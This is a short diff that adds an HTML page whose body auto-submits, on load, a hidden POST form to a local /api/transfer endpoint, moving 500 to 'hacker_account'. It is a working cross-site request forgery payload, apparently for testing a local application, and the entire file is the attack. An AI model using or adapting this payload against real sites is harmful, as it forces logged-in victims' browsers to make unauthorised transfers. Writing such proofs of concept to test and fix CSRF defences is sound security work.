@@ -1,0 +1,9 @@
+<!DOCTYPE html>
+<html>
+<body onload="document.getElementById('csrfForm').submit()">
+<form id="csrfForm" action="http://localhost:8080/api/transfer" method="POST">
+    <input type="hidden" name="to" value="hacker_account">
+    <input type="hidden" name="amount" value="500">
+</form>
+</body>
+</html>
